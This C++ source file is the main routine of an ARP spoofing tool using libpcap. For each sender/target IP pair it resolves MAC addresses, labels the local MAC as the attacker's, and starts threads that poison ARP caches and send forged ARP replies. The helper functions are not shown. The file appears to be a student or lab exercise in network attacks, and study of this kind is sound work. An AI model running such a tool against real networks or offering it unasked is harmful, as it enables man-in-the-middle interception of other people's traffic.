#include "init.h"
using namespace std;

int main(int argc, char* argv[])
{
    /* usage */
    if (argc <= 2 || argc%2 == 1)
    {
        usage();
        return -1;
    }
    char* dev = argv[1];// interface name, ex) eth0, wlan0

    /* pcap open */
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    /* get attacker's mac addr */
    u_char my_MACaddr[6];
    get_my_mac_addr(dev, my_MACaddr);

    /* create thread vector */
    vector<thread> arp_spoof_sessions;
    vector<thread> arp_send_sessions;

    int session_cnt = 0;
    for(int i=2; i < argc; i+=2)
    {
        session ses;
        ses.dev = argv[1];
        ses.handle = handle;
        memcpy(ses.attackerMAC, my_MACaddr, sizeof(u_char)*6);
        inet_pton(AF_INET, argv[i], &ses.senderIP);
        inet_pton(AF_INET, argv[i+1], &ses.targetIP);
        get_mac_addr_using_arp_req(handle, my_MACaddr, ses.senderMAC, ses.senderIP);
        get_mac_addr_using_arp_req(handle, my_MACaddr, ses.targetMAC, ses.targetIP);

        arp_spoof_sessions.push_back(thread(arp_spoof, ses));
        arp_send_sessions.push_back(thread(send_arp_reply,ses));
        session_cnt++;
    }

    for(int i=0; i<session_cnt; i++)
    {
        arp_spoof_sessions[i].join();
        arp_send_sessions[i].join();
    }


    return 0;
}
